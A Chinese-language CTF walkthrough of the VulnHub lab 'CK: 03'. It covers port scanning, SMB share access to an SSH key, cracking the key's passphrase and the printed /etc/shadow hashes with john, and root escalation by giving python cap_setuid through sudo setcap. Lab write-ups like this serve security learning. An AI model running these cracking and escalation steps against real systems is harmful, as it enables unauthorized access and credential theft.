# CK: 03

2024-6-13 https://www.vulnhub.com/entry/ck-03,464/

difficulty: medium

## IP

192.168.5.38

## Scan

Open Port -> 21,22,80,111,139,445,1337,2049,2121,20048,40505,51158

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 75fa37d1624a15877e2183b92fff0493 (RSA)
|   256 b8db2ccae270c3eb9aa8cc0ea21c686b (ECDSA)
|_  256 66a31b55cac2518441217f774045d49f (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: My File Server
| http-methods:
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      51158/tcp   nlockmgr
|   100021  1,3,4      52976/udp   nlockmgr
|   100021  1,3,4      56941/udp6  nlockmgr
|   100021  1,3,4      60109/tcp6  nlockmgr
|   100024  1          40325/udp   status
|   100024  1          40505/tcp   status
|   100024  1          44786/udp6  status
|   100024  1          45609/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
1337/tcp  open  waste?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, TerminalServerCookie:
|_    Why are you here ?!
2049/tcp  open  nfs_acl     3 (RPC #100227)
2121/tcp  open  ftp         ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx   3 root     root           16 Feb 19  2020 pub [NSE: writeable]
20048/tcp open  mountd      1-3 (RPC #100005)
40505/tcp open  status      1 (RPC #100024)
51158/tcp open  nlockmgr    1-4 (RPC #100021)
```

开放的端口较多

21 ftp 允许匿名登陆， /pub/log 里面有一堆 log 文件，没发现有用信息

139 和 445 smb 可能有映射信息:

```
smbmap -H 192.168.5.38

Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
print$                                            	NO ACCESS	Printer Drivers
smbdata                                           	READ, WRITE	smbdata
smbuser                                           	NO ACCESS	smbuser
IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.1)
```

enum4linux 发现 2 个用户名: smbuser bla

进入 smb：

```
smbclient  //192.168.5.38/smbdata/ -N
```

发现比上面匿名的 ftp 多了几个文件，重点看一下。todo、id_rsa、note.txt

```
cat todo
https://drive.google.com/uc?id=1JuQ4MIO9nfCUFYjP210V31EpsGAINKKc&export=download
https://drive.google.com/uc?id=19r5TYGhcM5qZOd9OTF-NwMryRAa1RteI&export=download

cat note.txt
I removed find command for security purpose, But don't want to delete 'getcap'.
I don't think 'getcap & capsh' known to anyone
```

这里提示已经将 find 删除，提示使用 getcap & capsh

得到了 id_rsa，尝试用此密钥去登陆 ssh，使用前面发现的 2 个用户 smbuser bla , 发现私钥需要密码，使用 john 进行爆破，得到私钥的密码 password。

重新登陆，可以登陆进 samuser 用户。

根据 note.txt 提示，尝试使用 getcap 发现了可提权程序：

```
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```

家目录中有一个 suid 程序 : runme 使用 strings 进行查看：

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setreuid
stdin
fgets
system
geteuid
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-X
UH-X
[]A\A]A^A_
/bin/sh
/bin/cat /home/bla/user.txt
Why are you here ?!
;*3$"
```

内核版本 3.10.0-229.el7 Red Hat 4.8.2-16 大概率存在内核提权。

/etc/shadow 有读取权限：

```
root:$6$zWU8uYN5$iHT030gilg9kM1iYCZt/z3q4fWpSNHwwLElFWof/C3MfbqgmbWAnG5sXFEdkMj60MLvYc6HEB7/REq2u2aVVh0:18317:0:99999:7:::
smbuser:$6$ePvCCtcG$mAQFQldd7/k25o51NK2gkccL24r7DzhrqZGTyjoLlhOCKb060BuB/X6Qlc7noUv61K9NXtaPeWnYRlLWigBfF1:18317:0:99999:7:::
bla:$6$ENV.HdIK$huk85ZxIDwa7jK8W1i0cfV/s67QDyYFaEHVrrpKjYesEJXAiaTo4jtNvfmKD4y1ULhub6gahOVIBaXxcpgm0n.:18317:0:99999:7:::
```

使用 john 进行破解，看是否能获得明文密码：

```
password         (smbuser)
itiseasy         (bla)
infosec          (root)
```

直接提权到 root 可以直接 su 输入 infosec

su 切换到 bla 用户, 发现 user flag：

```
[bla@fileserver ~]$ cat user.txt
  _____ _ _      ____                                     _____
 |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ /
 | |_  | | |/ _ \___ \ / _ \ '__\ \ / / _ \ '__|  _____    |_ \
 |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |
 |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/

Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f

you can crack this hash, because it is also my pasword

note: crack it, itiseasy

```

发现定时任务：

```
[bla@fileserver ~]$ crontab -l
* * * * * /home/bla/ynetd -p 1337 /bin/esclate
```

这里就是最开始 nmap 扫描出现的 1337 端口

sudo -l 发现：

```
(ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap
```

可以利用 setcap 设置相关权限，达到提权的目的：

```
sudo setcap 'cap_setuid+ep' /usr/bin/python2.7

python -c "import os; os.setuid(0); os.system('/bin/sh')"
```

得到了 root 权限：

```
[bla@fileserver ~]$ getcap /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep
[bla@fileserver ~]$ python -c "import os; os.setuid(0); os.system('/bin/sh')"
sh-4.2# id
uid=0(root) gid=1001(bla) 组=0(root),1001(bla)
sh-4.2# cd /root
sh-4.2# ls
proof.txt
sh-4.2# cat proof.txt
    _______ __    _____                                       _____
   / ____(_) /__ / ___/___  ______   _____  _____            |__  /
  / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ <
 / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ /
/_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/


flag : 7be300997079eaebcdf9975ede6746e9
```

下面的这些信息都是兔子洞，没什么用。

2049 nfs 可能有映射信息:

```
showmount -e 192.168.5.38
Export list for 192.168.5.38:
/smbdata 192.168.56.0/24

sudo mount -o rw,vers=3 192.168.5.38:/smbdata /tmp/nfs
mount.nfs: access denied by server while mounting 192.168.5.38:/smbdata
```

不能绑定

2121 ftp 允许匿名登陆，显示的内容跟 21 一致。

80 web 首页没什么信息，源码也没有，gobuster 进行扫描，只扫描到一个 index.html ，查看没什么内容，源码也没内容，相当于这个 80 web 端口是个空壳。

使用 nikto 进行扫描，发现隐藏的目录：

```
nikto -h http://192.168.5.38 -C all

/.ssh/authorized_keys
/.ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaOJE+/p4Y988V1I/soMH5RgdIavic3jBph74ZSUGWCf9I8mdmA6BszNd/QIxSbCXufb8r/yPMuoTDetJNXHyvb3RvPsSQ86N12G+ZaQATcGdf67S8WB+9vGJAPRxbbZiaokBjNXkGvAXs2mDhhtgiNjbnn3fb4KNvdeNJ/+xhZCRwknmKtf55zMgv2kFXFfmJO0kVogVYncnmsNohd0wJuImDJVHuGqvg9KmFCjb/gMhfh0jTIZB7cuseaKAzY8O2g4tMRNyVG5zwAmHkH0D00Du6ssXn1ZMCRq/imdDV7It1+L14d6bDTRCqm2FLRcKcx5PohJC1ElnzTkvhalEx smbuser@FileServer_CK10-test
```

1337 waste
